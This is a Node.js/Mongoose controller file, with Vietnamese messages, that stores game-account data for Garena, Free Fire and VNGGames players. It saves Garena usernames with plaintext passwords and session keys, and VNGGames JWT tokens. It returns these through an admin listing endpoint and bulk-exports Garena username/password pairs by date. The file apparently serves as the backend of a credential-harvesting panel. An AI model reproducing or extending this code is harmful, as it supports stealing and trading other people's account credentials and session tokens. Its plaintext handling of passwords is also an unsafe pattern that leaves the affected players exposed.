import { Api } from '~/models/api';
import moment from 'moment-timezone';
import { Player } from '~/models/player';
import { configCreateLog } from '~/configs';

const controlCreatePlayer = async (accounts, account_type) => {
    try {
        let newPlayer = null;
        if (account_type === 'freefire') {
            const { nickname, account_id, img_url, region, open_id, service_id } = accounts;

            const freeFire = await Player.findOne({ 'account_freefire.account_id': account_id });

            const account_freefire = {
                region,
                img_url,
                open_id,
                nickname,
                account_id,
            };

            if (freeFire) {
                await freeFire.updateOne({ account_freefire, updated_at: Date.now() });
            } else {
                newPlayer = await new Player({
                    service_id,
                    account_garena: null,
                    account_vnggames: null,
                    account_freefire,
                    account_type,
                }).save();
            }
        }

        if (account_type === 'garena') {
            const { username, password, uid, timestamp, id, session_key, service_id } = accounts;

            const garena = await Player.findOne({ 'account_garena.username': username });

            const account_garena = {
                id,
                uid,
                username,
                password,
                timestamp,
                session_key,
            };

            if (garena) {
                await garena.updateOne({ account_garena, updated_at: Date.now() });
            } else {
                newPlayer = await new Player({
                    service_id,
                    account_garena,
                    account_vnggames: null,
                    account_freefire: null,
                    account_type,
                }).save();
            }
        }

        if (account_type === 'vnggames') {
            const { user_id, login_type, jwt_token, server_id, server_name, role_id, role_name, front_id, module, service_id } = accounts;

            const vnggames = await Player.findOne({ 'account_vnggames.role_id': role_id });

            const account_vnggames = {
                user_id,
                login_type,
                jwt_token,
                server_id,
                server_name,
                role_id,
                role_name,
                front_id,
                module,
            };

            if (vnggames) {
                await vnggames.updateOne({ account_vnggames, updated_at: Date.now() });
            } else {
                newPlayer = await new Player({
                    service_id,
                    account_vnggames,
                    account_garena: null,
                    account_freefire: null,
                    account_type,
                }).save();
            }
        }

        return newPlayer;
    } catch (error) {
        configCreateLog('controllers/manage/api/player.log', 'controlCreatePlayer', error.message);
        return null;
    }
};

const controlGetApisPlayers = async (req, res) => {
    try {
        const { service_id } = req.query;

        if (!service_id) {
            return res.status(400).json({ error: 'Dịch vụ cần lấy người chơi là bắt buộc' });
        }

        const pageSize = 20;
        const skip = (req.page - 1) * pageSize;
        const count = await Player.countDocuments({ service_id });
        const pages = Math.ceil(count / pageSize);

        const players = await Player.find({ service_id }).skip(skip).limit(pageSize).sort({ created_at: -1 });

        let data = [];
        let account_type = '';
        for (let i = 0; i < players.length; i++) {
            const player = players[i];

            if (player.account_type === 'freefire') {
                data = players.map((item) => {
                    const { _id: key, account_freefire, created_at, status, updated_at } = item;
                    const { nickname, account_id, img_url, region, open_id } = account_freefire;

                    return {
                        key,
                        region,
                        status,
                        img_url,
                        open_id,
                        nickname,
                        account_id,
                        created_at,
                        updated_at,
                    };
                });

                account_type = player.account_type;
            }
            if (player.account_type === 'garena') {
                data = players.map((item) => {
                    const { _id: key, account_garena, created_at, status, updated_at } = item;
                    const { username, password, uid, timestamp, session_key, id } = account_garena;

                    return {
                        id,
                        key,
                        uid,
                        status,
                        username,
                        password,
                        timestamp,
                        created_at,
                        updated_at,
                        session_key,
                    };
                });

                account_type = player.account_type;
            }
            if (player.account_type === 'vnggames') {
                data = players.map((item) => {
                    const { _id: key, account_vnggames, created_at, status, updated_at } = item;
                    const { user_id, login_type, jwt_token, server_id, server_name, role_id, role_name, module, front_id } =
                        account_vnggames;

                    return {
                        user_id,
                        key,
                        login_type,
                        status,
                        jwt_token,
                        server_id,
                        server_name,
                        created_at,
                        updated_at,
                        role_id,
                        role_name,
                        module,
                        front_id,
                    };
                });

                account_type = player.account_type;
            }
        }

        const service = await Api.findById(service_id).select('title');

        res.status(200).json({
            data,
            pages,
            status: 200,
            account_type,
            service: service.title,
        });
    } catch (error) {
        configCreateLog('controllers/manage/api/player.log', 'controlGetApisPlayers', error.message);
        res.status(500).json({ error: 'Lỗi hệ thống vui lòng thử lại sau' });
    }
};

const controlExportsPlayers = async (req, res) => {
    try {
        const { account_type, date_start, date_end } = req.query;

        if (!account_type || account_type !== 'garena') {
            return res.status(400).json({ error: 'Tham số truy vấn không hợp lệ' });
        }
        if (!date_start || !date_end) {
            return res.status(400).json({ error: 'Thời gian dữ liệu muốn xuất là bắt buộc' });
        }

        const endDate = moment.tz(`${date_end} 23:59:59`, 'Asia/Ho_Chi_Minh').toDate();
        const startDate = moment.tz(`${date_start} 00:00:00`, 'Asia/Ho_Chi_Minh').toDate();

        if (isNaN(startDate.getTime()) || isNaN(endDate.getTime())) {
            return res.status(400).json({ error: 'Thời gian chọn không hợp lệ' });
        }

        const players = await Player.find({
            account_type,
            created_at: { $gte: startDate, $lte: endDate },
        });

        const data = players.map((player, index) => {
            const { account_garena, created_at } = player;

            return {
                id: index + 1,
                username: account_garena.username,
                password: account_garena.password,
                date: moment(created_at).format('DD/MM/YYYY HH:mm:ss'),
            };
        });

        res.status(200).json({
            data,
            status: 200,
            message: 'Xuất danh sách tài khoản Garena thành công',
        });
    } catch (error) {
        configCreateLog('controllers/manage/api/player.log', 'controlExportsPlayers', error.message);
        res.status(500).json({ error: 'Lỗi hệ thống vui lòng thử lại sau' });
    }
};

export { controlCreatePlayer, controlGetApisPlayers, controlExportsPlayers };
